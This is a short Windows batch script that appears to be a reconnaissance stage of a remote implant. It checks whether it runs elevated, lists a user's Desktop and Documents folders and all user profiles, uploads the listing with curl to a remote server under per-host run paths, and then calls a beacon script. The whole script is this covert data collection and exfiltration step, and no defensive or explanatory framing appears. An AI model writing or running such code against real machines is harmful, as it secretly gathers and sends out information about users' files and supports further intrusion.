@echo off
call C:\pdt\id.cmd
set T=C:\pdt\d4.txt
> %T% echo === whoami /groups (elevated?)
whoami /groups | find "Mandatory Label" >> %T%
>> %T% echo === alice profile
dir /b C:\Users\alice\Desktop C:\Users\alice\Documents >> %T% 2>&1
>> %T% echo === C:\Users
dir /b C:\Users >> %T% 2>&1
curl.exe -sS -T %T% "%SRV%/uploads/%ID%/%RUN%/diag4.txt" -o nul
call C:\pdt\beacon.cmd diag4 ok
